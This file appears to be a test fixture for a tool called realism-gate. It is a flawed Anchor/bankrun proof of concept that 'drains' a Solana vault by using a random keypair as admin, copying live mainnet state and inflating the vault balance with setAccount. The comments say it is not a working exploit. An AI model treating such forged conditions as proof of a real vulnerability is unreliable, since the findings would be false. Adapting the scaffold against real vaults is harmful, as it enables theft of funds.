// An Anchor proof of concept, run on bankrun, with four problems
// realism-gate reports. It is an example, not a working exploit: the program
// and its IDL are not part of this repository.
import { BN, Program } from "@coral-xyz/anchor";
import { BankrunProvider } from "anchor-bankrun";
import { startAnchor } from "solana-bankrun";
import { Connection, Keypair, LAMPORTS_PER_SOL, PublicKey, SystemProgram } from "@solana/web3.js";
import { expect } from "chai";
import IDL from "../target/idl/vault.json";

describe("vault", () => {
  it("lets the attacker drain the vault", async () => {
    const mainnet = new Connection(process.env.RPC_URL!);
    const admin = Keypair.generate();
    const attacker = Keypair.generate();
    const [vaultState] = PublicKey.findProgramAddressSync([Buffer.from("state")], new PublicKey(IDL.address));
    const live = await mainnet.getAccountInfo(vaultState);
    const context = await startAnchor(".", [], [
      { address: vaultState, info: live! },
      {
        address: attacker.publicKey,
        info: { lamports: LAMPORTS_PER_SOL, data: Buffer.alloc(0), owner: SystemProgram.programId, executable: false },
      },
    ]);
    const program = new Program<any>(IDL, new BankrunProvider(context));

    await program.methods.setWithdrawFee(new BN(0)).accounts({ admin: admin.publicKey, vaultState }).signers([admin]).rpc();
    const state = await context.banksClient.getAccount(vaultState);
    context.setAccount(vaultState, { ...state!, lamports: 1_000_000 * LAMPORTS_PER_SOL });
    await program.methods.withdraw().accounts({ vaultState, recipient: attacker.publicKey }).signers([attacker]).rpc();
    expect(Number(await context.banksClient.getBalance(attacker.publicKey))).to.be.greaterThan(0);
  });
});
